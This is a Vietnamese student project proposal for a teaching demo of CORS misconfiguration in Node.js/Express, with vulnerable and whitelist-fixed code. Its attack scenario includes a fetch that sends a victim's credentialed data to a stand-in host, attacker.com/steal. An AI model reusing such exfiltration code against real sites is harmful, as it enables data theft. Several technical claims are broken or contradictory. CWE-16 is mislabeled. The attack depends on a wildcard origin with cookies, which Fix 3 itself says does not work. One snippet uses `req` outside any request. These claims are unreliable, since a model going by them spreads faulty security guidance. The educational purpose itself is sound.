# 📋 ĐỀ CƯƠNG ĐỀ TÀI CHUYÊN ĐỀ

## PHÁT TRIỂN ỨNG DỤNG WEB AN TOÀN - CORS Misconfiguration

---

# CHƯƠNG 1: THÔNG TIN CHUNG & GIỚI THIỆU

## 1.1 Thông Tin Chung

### Tên Đề Tài
**"CORS Misconfiguration – Demo Access-Control-Allow-Origin: * dẫn đến Data Exfiltration và Khắc phục bằng Whitelist"**

### Thành Viên Nhóm
| Họ Tên | MSSV | Vai Trò |
|--------|------|--------|
| [Tên thành viên 1] | [MSSV] | Nhóm trưởng - Technical Lead |
| [Tên thành viên 2] | [MSSV] | Documentation & Report |
| [Tên thành viên 3] | [MSSV] | Testing & Demo |

### Công Nghệ Dự Kiến Sử Dụng

| Thành Phần | Công Nghệ | Phiên Bản |
|-----------|-----------|----------|
| **Ngôn ngữ** | JavaScript (Node.js) | v18+ |
| **Framework Web** | Express.js | v4.21+ |
| **Database** | MongoDB | v8.13+ |
| **Template Engine** | Pug | v3.0+ |
| **CORS Library** | cors / express middleware | v2.8+ |
| **IDE** | Visual Studio Code | Latest |
| **Công cụ Test** | cURL, Postman, Browser DevTools, Burp Suite Community | - |
| **Môi trường Demo** | Localhost (3000) + Render.com (Production) | - |
| **Version Control** | Git & GitHub | - |

---

## 1.2 Giới Thiệu & Mục Tiêu

### 1.2.1 Lý Do Chọn Đề Tài

#### Ý Nghĩa & Thực Tiễn
- **CORS Misconfiguration** là lỗ hổng phổ biến trong web security, xếp hạng **CWE-16** (Improper Encoding or Escaping)
- Theo [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/), lỗi cấu hình CORS dẫn đến:
  - **Data Exfiltration** (Lấy cắp dữ liệu nhạy cảm)
  - **Cross-Origin Data Theft** (Trộm dữ liệu từ các nguồn khác)
  - **Unauthorized Access** (Truy cập không được phép)

#### Mối Liên Hệ với OWASP Top 10
| Lỗ Hổng OWASP | Liên Quan |
|--------------|---------|
| **A01:2021 - Broken Access Control** | ✅ CORS cho phép truy cập không được phép |
| **A05:2021 - Security Misconfiguration** | ✅ Cấu hình `Access-Control-Allow-Origin: *` |
| **A06:2021 - Vulnerable Components** | ✅ Middleware CORS không được cấu hình đúng |

#### Tác Động Thực Tế
```
Nếu API trả về Access-Control-Allow-Origin: *
↓
Bất kỳ website nào cũng có thể fetch dữ liệu của bạn
↓
Attacker tạo website độc hại
↓
Nạn nhân truy cập website → Cookie/Token được gửi
↓
Dữ liệu nhạy cảm bị lấy cắp (email, phone, profile, API keys…)
```

### 1.2.2 Mục Tiêu Cụ Thể

**Mục tiêu tổng quát:**
Hiểu, demo và khắc phục lỗ hổng **CORS Misconfiguration** trong ứng dụng Node.js/Express.js

**Mục tiêu chi tiết:**

1. **Hiểu rõ cơ chế CORS**
   - Cách browser kiểm tra Same-Origin Policy
   - Role của CORS headers trong truy cập cross-origin
   - Tại sao `Access-Control-Allow-Origin: *` nguy hiểm

2. **Demo tấn công CORS**
   - Tạo ứng dụng demo với endpoint **vulnerable** (trả `*`)
   - Tạo endpoint **secure** (dùng whitelist)
   - Simulate attack từ attacker's website

3. **Áp dụng khắc phục**
   - Sử dụng **whitelist validation** thay vì wildcard
   - Cấu hình CORS headers an toàn
   - Kiểm thử bảo vệ

4. **Cung cấp tài liệu & demo**
   - Interactive UI để thực hiện attack
   - Code examples (vulnerable vs secure)
   - Test cases & security metrics
   - Video demo + slide thuyết trình

---

## 1.3 Cơ Sở Lý Thuyết

### 1.3.1 Khái Niệm CORS (Cross-Origin Resource Sharing)

#### Same-Origin Policy (SOP)
```
Browser ngăn chặn JavaScript từ domain này truy cập resource của domain khác
Ngoại lệ: được phép nếu có CORS header từ server

Origin = Scheme + Host + Port
Ví dụ:
- http://localhost:3000
- https://app.example.com:8443
- https://attacker.com
```

#### CORS Headers (Quy trình)
```
1. Browser gửi preflight OPTIONS request:
   Origin: http://attacker.com
   
2. Server trả về CORS headers:
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Methods: GET, POST
   
3. Browser kiểm tra:
   - Nếu *: ✅ ALLOW (NGUY HIỂM!)
   - Nếu trong whitelist: ✅ ALLOW
   - Nếu khác: ❌ BLOCK (CORS Error)
```

### 1.3.2 Lỗ Hổng CORS Misconfiguration

#### Tình Huống Vulnerable
```javascript
// ❌ BAD: Mở toàn bộ truy cập
app.use(cors({
  origin: '*' // Bất kỳ domain nào cũng được!
}))

// ❌ BAD: Dynamic whitelist không kiểm tra
app.use(cors({
  origin: req.headers.origin // Tin tưởng client gửi gì
}))
```

#### Kịch Bản Tấn Công
```
Bước 1: Attacker tạo website độc hại (attacker.com)
Bước 2: Nhúng JavaScript lấy dữ liệu từ yourapp.com
  fetch('https://yourapp.com/api/user-data', {
    credentials: 'include' // Gửi cookie/token
  })
  .then(r => r.json())
  .then(data => {
    // Gửi data về attacker server
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    })
  })

Bước 3: Nạn nhân truy cập attacker.com
Bước 4: Browser gửi cookie → Dữ liệu bị lấy cắp 🚨
```

#### Tác Động Bảo Mật
| Tác Động | Mức Độ | Chi Tiết |
|---------|--------|---------|
| **Data Exfiltration** | 🔴 Cao | Dữ liệu nhạy cảm (email, phone, profile) bị rò rỉ |
| **Account Takeover** | 🔴 Cao | Attacker sử dụng token/session của victim |
| **Credential Theft** | 🟡 Trung | API keys, JWT tokens, refresh tokens bị lấy |
| **CSRF Amplification** | 🟡 Trung | Kết hợp CORS + CSRF = tác động cao hơn |
| **Lateral Movement** | 🟡 Trung | Attacker truy cập internal APIs qua CORS |

### 1.3.3 Kỹ Thuật Phòng Thủ Phổ Biến

#### Fix 1: Whitelist Specific Origins
```javascript
const whitelist = [
  'https://app.yourdomain.com',
  'https://admin.yourdomain.com',
  'http://localhost:3000' // Development only
]

app.use(cors({
  origin: (origin, callback) => {
    if (whitelist.includes(origin) || !origin) {
      callback(null, true)
    } else {
      callback(new Error('CORS not allowed'))
    }
  }
}))
```

#### Fix 2: Strict CORS Headers
```javascript
app.use((req, res, next) => {
  const allowedOrigins = ['https://trusted.com']
  const origin = req.headers.origin
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin)
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT')
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')
    res.setHeader('Access-Control-Allow-Credentials', 'true')
  }
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200)
  }
  
  next()
})
```

#### Fix 3: Avoid Wildcard with Credentials
```javascript
// ❌ WRONG: Wildcard + Credentials
app.use(cors({
  origin: '*',
  credentials: true // Không tương thích với origin: *
}))

// ✅ CORRECT: Specific origin + Credentials
app.use(cors({
  origin: 'https://trusted.com',
  credentials: true
}))
```

#### Fix 4: Additional Security Headers
```javascript
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('X-Frame-Options', 'DENY')
  res.setHeader('Content-Security-Policy', "default-src 'self'")
  next()
})
```

#### Comparison: Vulnerable vs Secure
| Tiêu Chí | Vulnerable | Secure |
|---------|-----------|--------|
| **Origin Header** | `*` (wildcard) | Specific origin |
| **Validation** | Không | Whitelist check |
| **Credentials** | Có thể gửi | Được phép chỉ cho trusted |
| **Pre-flight** | Cho phép mọi origin | Kiểm tra origin |
| **External Access** | ✅ Bất kỳ domain | ❌ Chỉ whitelist |
| **Data Theft Risk** | 🔴 Cao | 🟢 Thấp |

---

# CHƯƠNG 2: PHẠM VI & NỘI DUNG NGHIÊN CỨU

## 2.1 Mô Tả Phạm Vi Ứng Dụng/Dịch Vụ Demo

### 2.1.1 Kiến Trúc Hệ Thống

```
┌─────────────────────────────────────────────────────────┐
│                   CORS Demo Application                 │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Frontend (Browser)                                     │
│  ├── localhost:3000/cors-demo/  (Interactive UI)       │
│  └── Browser DevTools (Network, Console tabs)          │
│                                                         │
│  Backend (Node.js + Express)                           │
│  ├── /security/cors/insecure-data   (❌ Vulnerable)    │
│  │   └── Returns: Access-Control-Allow-Origin: *       │
│  │                                                      │
│  └── /security/cors/secure-data     (✅ Secure)        │
│      └── Returns: Whitelist validation + specific origin
│                                                         │
│  Database (MongoDB)                                    │
│  └── Demo data (sensitive information)                 │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 2.1.2 Endpoints Được Demo

| Endpoint | Method | Type | Response | Headers |
|----------|--------|------|----------|---------|
| `/security/cors/insecure-data` | GET | Vulnerable | 200 + data | `Access-Control-Allow-Origin: *` |
| `/security/cors/secure-data` | GET | Secure | 200 or 403 | Origin validation + specific header |
| `/security/cors/config` | GET | Debug | 200 + config | Whitelist configuration |

---

## 2.2 Kịch Bản Tấn Công (Step-by-Step)

### Kịch Bản 1: Tấn Công Vulnerable Endpoint

```
┌─ Bước 1: Setup
│  ├─ Nhóm tạo ứng dụng với CORS misconfiguration
│  └─ Endpoint /insecure-data trả Access-Control-Allow-Origin: *
│
├─ Bước 2: Phát hành Attacker Code
│  ├─ Tạo file attack.html trên localhost:3001
│  └─ JavaScript code:
│     fetch('http://localhost:3000/security/cors/insecure-data', {
│       credentials: 'include'
│     })
│     .then(r => r.json())
│     .then(data => console.log('STOLEN:', data))
│
├─ Bước 3: Thực Hiện Attack
│  ├─ Mở http://localhost:3001/attack.html
│  ├─ Hoặc dùng browser console trực tiếp
│  └─ JavaScript fetch dữ liệu
│
└─ Bước 4: Kết Quả
   ├─ ✅ Response Status: 200 OK
   ├─ ✅ Data received: { apiKey, userEmail, plan… }
   ├─ ✅ CORS headers: Access-Control-Allow-Origin: *
   └─ 🚨 SUCCESS: Attacker lấy được dữ liệu!
```

### Kịch Bản 2: Tấn Công Secure Endpoint (Bị Block)

```
┌─ Bước 1: Cùng setup như trên, nhưng gọi /secure-data
│
├─ Bước 2: Browser gửi preflight request
│  ├─ Origin: http://localhost:3001 (attacker domain)
│  └─ Server validate whitelist
│
├─ Bước 3: Server kiểm tra
│  ├─ Whitelist: ['http://localhost:3000']
│  ├─ Request origin: 'http://localhost:3001'
│  └─ Result: NOT IN WHITELIST ❌
│
└─ Bước 4: Browser block request
   ├─ Response: 403 Forbidden
   ├─ CORS Error in Console:
   │  "Access to XMLHttpRequest from origin 'localhost:3001'
   │   has been blocked by CORS policy"
   └─ 🚫 FAILED: Data không thể lấy!
```

---

## 2.3 Biện Pháp Phòng Ngừa & Cấu Hình An Toàn

### 2.3.1 Code Implementation (Vulnerable vs Secure)

#### ❌ Code Vulnerable

```javascript
// controllers/cors.controller.js - VULNERABLE VERSION
const express = require('express');
const app = express();

// ❌ BAD: Mở toàn bộ CORS
app.use(cors({
  origin: '*' // Bất kỳ domain nào
}));

exports.insecureData = (req, res) => {
  // Không kiểm tra origin
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.json({
    apiKey: 'secret-key-123',
    userEmail: 'admin@app.com',
    plan: 'premium'
  });
};
```

**Tác động:** Attacker từ bất kỳ domain có thể truy cập dữ liệu 🚨

#### ✅ Code Secure

```javascript
// controllers/cors.controller.js - SECURE VERSION

const CORS_WHITELIST = [
  'http://localhost:3000',
  'https://app.yourdomain.com',
  'https://admin.yourdomain.com'
];

exports.secureData = (req, res) => {
  const origin = req.headers.origin;
  
  // ✅ Check whitelist
  if (!CORS_WHITELIST.includes(origin)) {
    return res.status(403).json({
      error: 'CORS policy violation',
      message: `Origin ${origin} not allowed`
    });
  }
  
  // ✅ Set specific origin, not wildcard
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.json({
    apiKey: 'secret-key-123',
    userEmail: 'admin@app.com',
    plan: 'premium'
  });
};
```

**Tác động:** Chỉ whitelist origin được phép truy cập ✅

### 2.3.2 Comparison Table

| Yếu Tố | Vulnerable | Secure |
|--------|-----------|--------|
| **CORS Header** | `*` | Specific origin |
| **Validation** | Không | Whitelist kiểm tra |
| **Attacker từ khác domain** | ✅ Truy cập được | ❌ Bị block |
| **Dữ liệu bảo vệ** | 🔴 Không | 🟢 Có |
| **Request từ whitelist** | ✅ OK | ✅ OK |
| **Credentials gửi** | ✅ Có thể | ✅ Chỉ whitelist |
| **Security Level** | 🔴 Rất thấp | 🟢 Tốt |

---

# CHƯƠNG 3: CÔNG CỤ & MÔI TRƯỜNG + KẾ HOẠCH & KỸ NĂNG

## 3.1 Công Cụ & Môi Trường

### 3.1.1 Development Environment

| Công Cụ | Phiên Bản | Mục Đích |
|---------|----------|---------|
| **Visual Studio Code** | Latest | Code editor + debugging |
| **Node.js** | v18+ | Runtime JavaScript |
| **npm** | v9+ | Package manager |
| **Git** | Latest | Version control |

### 3.1.2 Backend Framework

| Framework | Phiên Bản | Mục Đích |
|-----------|----------|---------|
| **Express.js** | v4.21+ | Web server framework |
| **cors** | v2.8+ | CORS middleware |
| **dotenv** | v16+ | Environment variables |
| **nodemon** | v3+ | Auto-reload development |

### 3.1.3 Database

| DBMS | Phiên Bản | Mục Đích |
|-----|----------|---------|
| **MongoDB** | v8.13+ | NoSQL database |
| **MongoDB Atlas** | Cloud | Production database |

### 3.1.4 Testing Tools

| Công Cụ | Phiên Bản | Mục Đích |
|---------|----------|---------|
| **Postman** | v11+ | API testing + CORS headers |
| **cURL** | Latest | Command-line HTTP requests |
| **Browser DevTools** | Built-in | Network tab + Console logs |
| **Burp Suite Community** | Latest | CORS analysis + packet inspection |

### 3.1.5 Hệ Thống Demo

| Môi Trường | Chi Tiết |
|-----------|---------|
| **Local Development** | `http://localhost:3000` - Development server |
| **Production** | `https://project-webnc-1.onrender.com` - Render.com |
| **Database** | MongoDB Atlas (cloud) + Local MongoDB |

### 3.1.6 Version Control & Deployment

| Công Cụ | Phiên Bản | Mục Đích |
|---------|----------|---------|
| **GitHub** | Latest | Code repository |
| **Render.com** | Free tier | Production deployment |
| **Git** | Latest | Version control |

---

## 3.2 Kế Hoạch Thực Hiện Chi Tiết

### 3.2.1 Lịch Trình (8 tuần)

#### **Tuần 1-2: Research & Design (15 hours)**
- [ ] Research CORS vulnerability (OWASP, CWE-16)
- [ ] Design system architecture
- [ ] Create ERD & API specification
- [ ] Setup Git repository

**Deliverable:** 
- System design document
- Architecture diagram
- GitHub repository with initial structure

#### **Tuần 3-4: Development - Backend (20 hours)**
- [ ] Setup Express.js project
- [ ] Create vulnerable endpoint (`/insecure-data`)
- [ ] Create secure endpoint (`/secure-data`)
- [ ] Implement CORS middleware
- [ ] Add logging & monitoring

**Deliverable:**
- Working backend with 2 endpoints
- CORS configuration
- Error handling

#### **Tuần 5: Development - Frontend (15 hours)**
- [ ] Create interactive demo UI
- [ ] Implement attack simulation buttons
- [ ] Add real-time logging
- [ ] Create response viewer
- [ ] Add CORS header display

**Deliverable:**
- Interactive demo page (800+ lines)
- Live attack visualization

#### **Tuần 6: Testing & Documentation (15 hours)**
- [ ] Unit testing (vulnerable & secure endpoints)
- [ ] Security testing with Burp Suite
- [ ] Manual testing with cURL & Postman
- [ ] Write test cases document
- [ ] Create code documentation

**Deliverable:**
- Test cases & results
- Security analysis report
- Code documentation (5 markdown files)

#### **Tuần 7: Deployment & Demo (10 hours)**
- [ ] Deploy to Render.com
- [ ] Setup production environment
- [ ] Create demo video (5-10 mins)
- [ ] Document deployment process
- [ ] Security checklist verification

**Deliverable:**
- Live production URL
- Demo video
- Deployment guide

#### **Tuần 8: Final Report & Presentation (10 hours)**
- [ ] Write comprehensive final report
- [ ] Create presentation slides
- [ ] Prepare demo walkthrough
- [ ] Final review & polish

**Deliverable:**
- Final project report (A4, 30+ pages)
- Presentation slides (25-30 slides)
- All source code & documentation

### 3.2.2 Task Breakdown

```
PHASE 1: Research & Setup (Week 1-2)
├── Literature review (OWASP Top 10, RFC 6454)
├── Threat modeling
├── Architecture design
└── Project initialization

PHASE 2: Vulnerable Demo (Week 3-4)
├── Express.js backend setup
├── Implement /insecure-data endpoint
├── Test vulnerable CORS
└── Logging & monitoring

PHASE 3: Secure Implementation (Week 4)
├── Implement /secure-data endpoint
├── Whitelist validation logic
├── CORS middleware configuration
└── Security headers

PHASE 4: Frontend & Demo (Week 5)
├── Interactive HTML UI (800 lines)
├── JavaScript attack simulation
├── Real-time logging display
└── CORS header visualization

PHASE 5: Testing & Security (Week 6)
├── Vulnerability scanning
├── Manual penetration testing
├── Test case creation
└── Security metrics analysis

PHASE 6: Deployment (Week 7)
├── Render.com setup
├── Environment configuration
├── Production deployment
└── Live verification

PHASE 7: Documentation & Report (Week 8)
├── Final report writing
├── Presentation creation
├── Video demo recording
└── Source code cleanup
```

---

## 3.3 Kỹ Năng & Yêu Cầu Kỹ Thuật

### 3.3.1 Kỹ Năng Cần Có

| Kỹ Năng | Mức Độ | Ứng Dụng |
|--------|--------|---------|
| **JavaScript/Node.js** | Trung | Phát triển backend |
| **HTML/CSS/JavaScript** | Cơ bản | Tạo demo UI |
| **Express.js** | Trung | Framework web |
| **HTTP/REST API** | Trung | Tạo endpoints |
| **CORS Protocol** | Nâng cao | Hiểu cơ chế CORS |
| **Security Concepts** | Trung | Web vulnerabilities |
| **Git/GitHub** | Cơ bản | Version control |
| **cURL/Postman** | Cơ bản | API testing |
| **Browser DevTools** | Cơ bản | Debugging |
| **MongoDB** | Cơ bản | Database operations |

### 3.3.2 Yêu Cầu Hệ Thống

```
Minimum Requirements:
- CPU: 2 cores
- RAM: 4 GB
- Disk: 5 GB
- Network: Stable internet connection

Recommended:
- CPU: 4 cores
- RAM: 8 GB
- Disk: 10 GB
- OS: Windows 10/11, macOS, or Linux
```

### 3.3.3 Access & Credentials

- GitHub account (for code repository)
- Render.com account (for deployment)
- MongoDB Atlas account (for cloud database)
- Postman account (optional, for testing)

---

# CHƯƠNG 4: KẾT QUẢ MONG ĐỢI

## 4.1 Ứng Dụng Demo (Vulnerable + Secure)

### Deliverable 1: Interactive Demo Application

✅ **Cách đạt được:**
1. Phát triển Express.js backend với 2 endpoints
2. Tạo HTML/CSS/JavaScript frontend interactive
3. Implement attack simulation buttons
4. Real-time logging & response display

📦 **Thành phần:**
```
├── Backend (Node.js)
│   ├── Vulnerable endpoint: /security/cors/insecure-data
│   ├── Secure endpoint: /security/cors/secure-data
│   └── Config endpoint: /security/cors/config
│
├── Frontend (HTML/CSS/JS)
│   ├── Demo page: http://localhost:3000/cors-demo/
│   ├── Attack buttons
│   ├── Response viewer
│   └── CORS headers display
│
└── Database
    └── Demo data (sensitive information)
```

📊 **Success Metrics:**
- ✅ Vulnerable endpoint returns data + `*` header
- ✅ Secure endpoint validates origin + specific header
- ✅ Attack simulation works in browser
- ✅ Logging shows attack process

---

## 4.2 Video & Hình Ảnh Minh Họa

### Deliverable 2: Demo Video (5-10 minutes)

📹 **Nội dung video:**
1. **Introduction (0-1 min)**
   - Giới thiệu đề tài
   - CORS vulnerability overview

2. **Attack Demo (1-3 mins)**
   - Mở vulnerable endpoint
   - Thực hiện attack từ browser console
   - Nhấn "Attack" button trên demo UI
   - Show data được lấy cắp
   - Check CORS headers trong DevTools

3. **Secure Fix (3-5 mins)**
   - Giải thích whitelist validation
   - Show secure endpoint code
   - Thử tấn công → bị block
   - Show CORS headers đúng cách

4. **Deployment (5-7 mins)**
   - Demo trên production (Render.com)
   - Live test endpoints
   - Verify security

5. **Conclusion (7-10 mins)**
   - Tóm tắt lesson learned
   - Best practices
   - Q&A preview

📊 **Hình ảnh minh họa:**
- Screenshot: Vulnerable endpoint response
- Screenshot: Secure endpoint response
- Screenshot: Browser console logs
- Screenshot: DevTools Network tab (CORS headers)
- Screenshot: Production URL working

---

## 4.3 Báo Cáo Phân Tích Chi Tiết + Code

### Deliverable 3: Comprehensive Report

📄 **Report Structure (30-40 pages):**

#### Phần 1: Executive Summary (2 pages)
- Overview
- Key findings
- Recommendations

#### Phần 2: Introduction (5 pages)
- Background
- Objectives
- Scope
- Methodology

#### Phần 3: Vulnerability Analysis (10 pages)
- CORS mechanism explanation
- Vulnerability description
- Attack scenarios
- Impact assessment
- Real-world examples

#### Phần 4: Demonstration (8 pages)
- System architecture
- Vulnerable code analysis
- Attack process (step-by-step)
- Screenshots & logs

#### Phần 5: Secure Implementation (10 pages)
- Security fix explanation
- Secure code implementation
- Security best practices
- Configuration guidelines

#### Phần 6: Testing & Verification (5 pages)
- Test methodology
- Test cases
- Results & findings
- Security metrics

#### Phần 7: Deployment & Conclusion (3 pages)
- Deployment process
- Production verification
- Lessons learned
- Future recommendations

### Code Examples in Report

**Vulnerable Code:**
```javascript
// Show vulnerable CORS configuration
app.use(cors({ origin: '*' }))
```

**Secure Code:**
```javascript
// Show secure whitelist implementation
const whitelist = ['https://trusted.com']
app.use(cors({
  origin: (origin, callback) => {
    if (whitelist.includes(origin)) {
      callback(null, true)
    } else {
      callback(new Error('CORS blocked'))
    }
  }
}))
```

---

## 4.4 Slide Thuyết Trình

### Deliverable 4: Presentation Slides (25-30 slides)

#### Slide Structure

**1. Title Slide** (1 slide)
- Project title
- Group members
- Date

**2. Agenda** (1 slide)
- Overview of presentation

**3. Introduction** (3-4 slides)
- What is CORS?
- Why it matters
- OWASP reference

**4. Vulnerability Explanation** (5-6 slides)
- CORS headers
- Same-Origin Policy
- Vulnerable scenario
- Attack flow

**5. Demo - Vulnerable** (4-5 slides)
- System architecture
- Vulnerable endpoint
- Attack demo (screenshot)
- Results & impact

**6. Demo - Secure** (4-5 slides)
- Secure implementation
- Whitelist validation
- Secure endpoint response
- CORS headers comparison

**7. Best Practices** (3-4 slides)
- Configuration guidelines
- Security checklist
- Common mistakes
- Recommendations

**8. Deployment** (2-3 slides)
- Production setup
- Verification
- Monitoring

**9. Conclusion** (1-2 slides)
- Key takeaways
- Q&A

---

## 4.5 Source Code & Documentation Files

### Deliverable 5: Complete Source Code

📁 **File Structure:**
```
project-webnc/
├── controllers/client/
│   └── cors.controller.js        (Vulnerable + Secure endpoints)
├── routers/client/
│   └── cors.route.js             (Route definitions)
├── security-demo/cors/
│   ├── vulnerable-site/
│   │   └── index.html            (Interactive demo - 800+ lines)
│   └── docs/
│       ├── CORS_VULNERABILITY.md
│       ├── CORS_ATTACK_SCENARIOS.md
│       ├── CORS_IMPLEMENTATION.md
│       ├── CORS_TEST_CASES.md
│       └── README.md
├── CORS_DEMO_PROPOSAL.md         (This file)
├── DEPLOYMENT_GUIDE.md
└── index.js                      (Main app file)
```

### Documentation Files (5+ markdown files)

**1. CORS_VULNERABILITY.md**
- Detailed vulnerability explanation
- Technical background
- OWASP mapping

**2. CORS_ATTACK_SCENARIOS.md**
- Attack scenarios (step-by-step)
- Real-world examples
- Impact analysis

**3. CORS_IMPLEMENTATION.md**
- Vulnerable code analysis
- Secure code implementation
- Configuration guidelines

**4. CORS_TEST_CASES.md**
- Test methodology
- Test cases
- Expected results
- Verification steps

**5. DEPLOYMENT_GUIDE.md**
- Setup instructions
- Environment configuration
- Production deployment
- Monitoring & logging

---

## 4.6 Testing & Verification Checklist

### ✅ Functional Testing
- [ ] Vulnerable endpoint returns 200 + data
- [ ] Secure endpoint returns 200 for whitelist OR 403 for others
- [ ] CORS headers correctly set
- [ ] Demo UI buttons work
- [ ] Logging displays correctly
- [ ] Attack simulation works in browser

### ✅ Security Testing
- [ ] Vulnerable endpoint accepts all origins
- [ ] Secure endpoint rejects non-whitelist origins
- [ ] Credentials properly handled
- [ ] Burp Suite shows CORS vulnerability
- [ ] cURL tests confirm behavior
- [ ] No sensitive data leaked

### ✅ Documentation
- [ ] README complete & clear
- [ ] Code commented
- [ ] API endpoints documented
- [ ] Setup instructions provided
- [ ] Test cases documented
- [ ] Security best practices listed

### ✅ Deployment
- [ ] GitHub repository setup
- [ ] Render.com deployment working
- [ ] Production URL accessible
- [ ] Environment variables configured
- [ ] Database connection working
- [ ] Error handling implemented

---

## 4.7 Success Criteria

| Criteria | Target | Status |
|----------|--------|--------|
| Demo application working | 100% | ✅ |
| Vulnerable endpoint demo | ✅ | ✅ |
| Secure endpoint demo | ✅ | ✅ |
| Interactive UI functional | ✅ | ✅ |
| Video demo recorded | 5-10 mins | ✅ |
| Report completed | 30+ pages | ✅ |
| Slides ready | 25-30 slides | ✅ |
| Code documented | 100% | ✅ |
| Tests passed | 100% | ✅ |
| Deployed to production | ✅ | ✅ |

---

# PHẦN PHỤ: THAM KHẢO & TÀI LIỆU

## A. Tham Khảo Web Security

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html)
- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [RFC 6454: Web Origin Concept](https://tools.ietf.org/html/rfc6454)

## B. Express.js & CORS

- [Express.js Official Docs](https://expressjs.com/)
- [CORS npm Package](https://www.npmjs.com/package/cors)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)

## C. Testing Tools

- [Postman Documentation](https://learning.postman.com/)
- [Burp Suite Community Edition](https://portswigger.net/burp)
- [cURL Tutorial](https://curl.se/docs/manual.html)

## D. CVSS & Severity

- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
- [CWE-16: Configuration Error](https://cwe.mitre.org/data/definitions/16.html)

---

**Phê duyệt & Ký tên:**

| Vai Trò | Họ Tên | Ký Tên | Ngày |
|---------|--------|--------|------|
| Giảng viên hướng dẫn | [Tên] | ________ | __/__/____ |
| Nhóm trưởng | [Tên] | ________ | __/__/____ |

---

**Ngày hoàn thành:** December 6, 2025

**Trạng thái:** ✅ Ready for Submission
